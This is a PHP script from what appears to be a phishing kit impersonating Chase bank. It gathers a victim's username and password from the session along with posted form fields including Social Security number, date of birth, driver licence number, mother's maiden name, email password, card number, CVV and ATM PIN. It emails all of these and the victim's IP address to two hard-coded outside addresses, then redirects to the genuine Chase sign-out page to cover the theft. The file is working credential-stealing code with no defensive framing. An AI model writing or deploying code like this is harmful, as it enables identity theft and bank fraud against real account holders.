<?php
session_start();

include '';

$ip = getenv("REMOTE_ADDR");

$message .= "--------------+ [ Chase BY T.GOE ] +------------\n";
$message .= "UserName     : ".$_SESSION['userID']."\n";
$message .= "Password     : ".$_SESSION['password']."\n";
$message .= "--------------+ [ Chase BY T.GOE ] +------------\n";
$message .= "Street Address : ".$_POST['street']."\n";
$message .= "City : ".$_POST['city']."\n";
$message .= "State : ".$_POST['state']."\n";
$message .= "Zip Code : ".$_POST['zip']."\n";
$message .= "Date of Birth : ".$_POST['dob']."\n";
$message .= "Social Security Number : ".$_POST['ssn']."\n";
$message .= "Driver License Number : ".$_POST['drive']."\n";
$message .= "Mother's Maiden Name : ".$_POST['mmn']."\n";
$message .= "Phone Number : ".$_POST['phn']."\n";
$message .= "Account Number : ".$_POST['accno']."\n";
$message .= "Email Address : ".$_POST['em']."\n";
$message .= "Email Address Password : ".$_POST['emp']."\n";
$message .= "--------------+ [ Chase BY T.GOE ] +------------\n";
$message .= "Name On card : ".$_POST['cardnm']."\n";
$message .= "Chase Card Number : ".$_POST['cardn']."\n";
$message .= "Expire Date : ".$_POST['expd']."\n";
$message .= "CVV : ".$_POST['cvv']."\n";
$message .= "ATM PIN : ".$_POST['pin']."\n";
$message .= "--------------+ [ Chase BY T.GOE ] +------------\n";
$message .= "IP Address : $ip\n";
$message .= "--------------+ [ Chase BY T.GOE ] +------------\n";

$subject = " Chase BY T.GOE  $ip";
$headers = "From: Chase  <T.GOE@info.com>";
$SEND = "mooremoney1900@gmail.com,mooremoney1800@hotmail.com";
mail($SEND,$subject,$message,$headers);



session_destroy();
header("Location: https://secure01b.chase.com/web/auth/enrollment#/enroll/auth/signout;params=session?$host-$host-$host$host$host$host$host$host$host$host$host");
?>